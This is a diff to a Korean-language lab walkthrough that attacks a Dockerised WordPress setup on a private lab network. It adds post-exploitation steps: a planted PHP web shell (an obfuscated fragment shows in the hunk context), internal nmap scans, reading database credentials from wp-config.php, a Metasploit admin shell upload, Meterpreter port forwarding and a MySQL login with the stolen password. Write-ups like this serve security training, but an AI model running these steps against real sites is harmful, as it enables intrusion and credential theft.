@@ -98,7 +98,10 @@ $C=$B('',$k);$C();
 
 - [Update File]
 
+
+ 
 ## 웹쉘 연결 후 내부 정보 수집
+
 - 대부분 wordpress에서 플러그인 업로드를 하면 /wp-content/plugins/[펄러그인].php
 ```
 http://192.168.146.129:8000/wp-content/plugins/hello.php hacker
@@ -119,8 +122,79 @@ chmod +x nmap
 
 > ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/67d1f594-b753-472f-8d7a-26275ef88c6e)
 
-
 ```
 ip addr
-./nmap 172.18.0.0/16
+./nmap 172.18.0.0/24
 ```
+
+- nmap 결과로 보아 현재위치는 웹서비스를 제공하는 서버이다.
+- 172.18.0.2 는 Database mysql 서버이다.
+- 172.18.0.4 는 ssh로 내부로 접속을 하기 위한 bastion 서버로 추측 할 수있으며, 8022의 목적을 알 수 없는 포트가 열려있다.
+- 일반적으로 8022 포트는 표준 SSH(Secure Shell) 포트인 22의 대안으로 사용될 수 있다.
+
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/c59d3ba2-7fae-48c9-b422-aea6ca8decfb)
+
+- db 서버가 있는 것을 확인했으니 db서버 정보를 획득 해야한다.
+- wordpress 에서는 wp-config.php에 db 계정 정보가 담겨있다.
+
+```
+cd /var/www/html
+ls
+cat wp-config.php
+```
+
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/7d441bb0-b738-4597-b4cd-871aa6b8ae55)
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/2738974d-576d-45e2-9b2b-695a5801cc91)
+
+- 브라우저로 접속했을 때 docker환경인 것을 힌트로 얻을 수 있었지만 확실하게 한번더 확인한다.
+- docker 환경에 init 프로세스는 대부분 docker 이므로
+- /proc/1/cgroup 내용을 확인하여 docker 환경임을 확신한다.
+
+```
+cat /proc/1/cgroup
+```
+
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/8657076e-2fd2-42c7-b492-805a7873818c)
+
+
+
+## 8022 포트 공격
+- Kali에서 다른 터미널을 연다.
+
+```
+sudo msfconsole
+search wp_admin
+use exploit/unix/webapp/wp_admin_shell_upload
+show options
+set RHOSTS 192.168.146.129
+set RPORT 8000
+set USERNAME bob
+set PASSWORD Welcome1
+exploit
+```
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/12a8d10e-1035-4971-b134-92d1c9f11c37)
+
+- 내부에 침투하여 nmap으로 내부망 서버 구성을 확인하였다.
+- 미터프리터 즉 웹서비스안에 msfconsole로 침투 성공도 하였다.
+- 미터프리터의 기능인 포트포워딩 기능을 이용하여 해커의 8022 포트를 연다
+- 해커는 자신의 브라우저에 localhost:8022로 접속을하면 침투한 내부망의 bastion 서버인 172.18.0.4:8022로 포워딩 해준다.
+
+```
+portfwd add -l 8022 -p 8022 -r 172.18.0.4
+```
+
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/2c786847-330a-4c68-8ad7-42552c70097e)
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/02d167a5-9741-47c3-87e6-9fd59ec6b476)
+
+- 분명 172.18.0.4:8022로 포트포워딩을 했는데 172.18.0.2로 접속되었다.
+- 즉 172.18.0.4:8022는 내부 db서버인 172.18.0.2로 접속하는 포트였던 것이다.
+- 획득한 db정보를 통해 접속해보자.
+
+```
+mysql -u wordpress -p
+Enter password : WordPressISBest
+```
+
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/d3f8d1d3-f2fc-4085-977b-e39f98be548f)
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/12eb1c7b-d758-4ed7-af81-a858a0defd48)
+
